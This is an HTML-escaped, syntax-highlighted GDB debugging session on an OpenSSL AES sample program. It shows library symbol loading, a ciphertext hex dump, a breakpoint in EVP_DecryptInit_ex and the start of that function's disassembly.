&lt;span style=&#34;color: #268BD2&#34;&gt;Reading&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;lib&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;ld&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;linux.so.2...&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;no&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;debugging&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;found&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;...done.&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Loaded&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;lib&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;ld&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;linux.so.2&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Reading&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;system&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;supplied&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;DS&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;O&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;at&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7fe1000&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;...&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;no&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;debugging&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;found&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;...done.&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Reading&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;usr&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;lib&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i386&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;linux&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gnu&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i686&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;cmov&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;libcrypto.so.1.0.0...&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;no&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;debugging&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;found&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;...done.&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Loaded&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;usr&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;lib&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i386&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;linux&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gnu&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i686&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;cmov&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;libcrypto.so.1.0.0&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Reading&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;lib&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i386&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;linux&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gnu&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i686&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;cmov&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;libc.so.6...&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;no&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;debugging&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;found&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;...done.&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Loaded&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;lib&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i386&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;linux&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gnu&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i686&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;cmov&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;libc.so.6&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Reading&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;lib&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i386&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;linux&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gnu&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i686&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;cmov&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;libdl.so.2...&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;no&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;debugging&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;found&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;...done.&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Loaded&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;lib&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i386&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;linux&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gnu&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i686&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;cmov&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;libdl.so.2&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Reading&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;lib&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i386&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;linux&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gnu&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;libz.so.1...&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;no&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;debugging&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;found&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;...done.&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Loaded&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;lib&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i386&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;linux&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gnu&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;libz.so.1&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Ciphertext&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;is&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0000&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;51&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;34&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;f&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;21&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;d&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;f6&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;d&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;c6&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;d&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;c1&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ae&lt;/span&gt;   &lt;span style=&#34;color: #268BD2&#34;&gt;Q4?&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;N....mA...&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0010&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;e0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;a7&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;de&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;a0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;fa&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;b9&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;b0&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;21&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;c6&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;d3&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;36&lt;/span&gt;   &lt;span style=&#34;color: #268BD2&#34;&gt;......l..&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;....6&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0020&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;70&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;b&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ec&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;e1&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;bc&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;a&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;f4&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;c6&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;26&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;f&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;e&lt;/span&gt;   &lt;span style=&#34;color: #268BD2&#34;&gt;p&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;.i....&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;a..&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;a_.&lt;/span&gt;

&lt;span style=&#34;color: #268BD2&#34;&gt;Breakpoint&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;Reading&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;symbols&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;AES&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;OpenSSL.c...done.&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a20&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;EVP_DecryptInit_ex&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;usr&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;lib&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i386&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;linux&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gnu&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;i686&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;cmov&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;libcrypto.so.1.0.0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;gdb&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;di&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;sass&lt;/span&gt;    &lt;span style=&#34;color: #586E75&#34;&gt;; disassembling the function&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;Dump&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;code&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;EVP_DecryptInit_ex&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a20&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;   &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a21&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;sub&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x28&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a24&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a28&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color: #2AA198&#34;&gt;0xb7e510db&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;xb7ed3a2d&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;13&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xe65c7&lt;/span&gt;
